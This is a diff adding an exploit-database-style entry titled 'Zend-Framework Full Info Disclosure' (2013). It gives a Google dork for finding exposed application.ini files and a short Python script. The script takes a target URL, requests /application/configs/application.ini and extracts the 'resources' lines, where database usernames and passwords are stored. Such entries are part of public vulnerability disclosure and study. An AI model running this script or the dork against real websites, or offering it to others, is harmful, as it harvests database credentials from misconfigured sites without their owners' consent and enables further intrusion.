@@ -1,0 +1,29 @@
+# Exploit Title : Zend-Framework Full Info Disclosure
+# Google Dork : inurl:/application/configs/application.ini
+# Date : 26/11/2013
+# Exploit Author : Ariel Orellana
+# Vendor Homepage : http://framework.zend.com/
+# Category : Web applications
+# Tested on : GNU/Linux
+
+#[Comment]Greetz : Daniel Godoy
+
+#[PoC] :
+#The username and password of the database may be obtained trough the "application.ini" file
+
+#Vulnerable page : http://target.com/application/configs/application.ini
+
+
+#!/usr/bin/python
+import string
+import re
+from urllib2 import Request, urlopen
+disc = "/application/configs/application.ini"
+url = raw_input ("URL: ")
+req = Request(url+disc)
+rta = urlopen(req)
+print "Result"
+html = rta.read()
+rdo = str(re.findall("resources.*=*", html))
+print rdo
+exit
